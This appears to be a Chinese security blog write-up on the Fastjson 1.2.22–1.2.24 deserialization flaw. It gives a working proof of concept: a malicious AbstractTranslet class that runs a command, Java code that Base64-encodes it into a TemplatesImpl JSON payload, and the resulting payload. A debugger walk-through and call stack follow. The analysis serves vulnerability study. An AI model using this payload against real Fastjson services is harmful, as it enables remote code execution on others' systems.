## 简介

对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：

- 基于TemplateImpl；
- 基于JNDI（又分为基于Bean Property类型和Field类型）；



这里我使用的环境是JDK7u51

fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，unboundid-ldapsdk-4.0.9.jar

## 反序列化TemplatesImpl类+类加载触发

先看一下POC：

`Test.java`

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```

`fastjson.java`

```java
package fastjson;

import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;


import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class fastjson {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String evilClassPath = System.getProperty("user.dir") + "\\out\\production\\UNSER\\fastjson\\Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String payload = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'','_tfactory':{ },\"_outputProperties\":{ }," +
                    "\"_version\":\"\"}\n";

            JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

我们构造的payload：

```json
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgAAADQA...CJAAk="],
	"_name": "s",
	"_tfactory": {},
	"_outputProperties": {},
}
```

解释一下json中各部分的含义：

- **@type**——指定的解析类，即`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，`_bytecodes`和`_name`都是私有属性，所以想要反序列化这两个属性，需要在`parseObject()`时设置`Feature.SupportNonPublicField`；
- **_bytecodes**——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；
- **_outputProperties**——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；
- `_tfactory:{}，_name`——为了满足漏洞点触发之前不报异常及退出，我们还需要满足 `_name` 不为 null ，`_tfactory` 不为 null；

最终运行即可弹出计算器：

![image-20220417120716631](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220417120716631.png)

### 流程分析

首先在反序列化处打上断点：

```java
JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);
```

后续跟进到`DefaultJSONParser parser`

```java
DefaultJSONParser parser = new DefaultJSONParser(input, config, featureValues);
```

在`DefaultJSONParser`会对json格式进行扫描

![image-20220417121652762](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220417121652762.png)

这里匹配到`{`并将token设置为12，继续跟进`parser.parseObject`

![image-20220418001959731](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418001959731.png)

继续跟进`parser.parse`方法，通过switch语句进入case12，执行`DefaultJSONParser.parseObject()`

通过while语句循环解析json数据

![image-20220418131358173](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418131358173.png)

其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：

![image-20220418132218436](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418132218436.png)

之后通过判断后调用scanSymbol()获取到了@type对应的指定类`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，并调用TypeUtils.loadClass()函数加载该类

![image-20220418134137821](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418134137821.png)

跟进，这里两个if语句判断当前类名是否以`[`开头或以`L`开头以`;`结尾，这部分涉及**之后补丁的绕过**

![image-20220418134353578](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418134353578.png)

通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：

![image-20220418134731261](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418134731261.png)

返回后，程序继续回到DefaultJSONParser.parseObject()中往下执行，在最后调用`JavaBeanDeserializer.deserialze()`对目标类进行反序列化：

![image-20220418135825259](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418135825259.png)

继续跟进，循环扫描解析，解析到key为`_bytecodes`时，调用parseField()进一步解析：

![image-20220418142834334](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418142834334.png)

对于该属性，在smartMatch函数中对其下划线进行了删除

```java
for(i = 0; i < key.length(); ++i) {
                    char ch = key.charAt(i);
                    if (ch == '_') {
                        snakeOrkebab = true;
                        key2 = key.replaceAll("_", "");
                        break;
                    }
```

之后在解析出`_bytecodes`对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：

![image-20220418144305992](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418144305992.png)

之后循环解析json的其他数据，当解析到`_outputProperties`时，发现会通过反射机制调用`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`方法

![image-20220418145937480](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418145937480.png)

之后就是TemplatesImpl链的利用方法了，这里不做过多分析。总体利用链

- 构造一个 TemplatesImpl 类的反序列化字符串，其中 `_bytecodes` 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 `newInstance()` 实例化。
- 在反序列化过程中，由于getter方法 `getOutputProperties()`，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：`getOutputProperties()` -> `newTransformer()` -> `getTransletInstance()` -> `defineTransletClasses()` / `EvilClass.newInstance()`.

调用栈：

```
getTransletInstance:387, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:302, JSON (com.alibaba.fastjson)
main:36, fastjson (fastjson)
```

### 为什么恶意类需要继承AbstractTranslet类

getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，跟进一下

![image-20220418151623787](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418151623787.png)

这里会判断恶意类的父类类名是否是`ABSTRACT_TRANSLET`，是的话`_transletIndex`变量的值被设置为0，到后面的if判断语句中就不会被识别为`<0`而抛出异常终止程序。

### 为什么需要对_bytecodes进行Base64编码

FastJson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对`_bytecodes`字段进行Base64加密处理。

![image-20220418152523694](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418152523694.png)

![image-20220418152543232](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220418152543232.png)





参考：

https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson1.22-1.24/Fastjson1.22-1.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E4%B9%8BTemplateImpl/Fastjson1.22-1.24.md
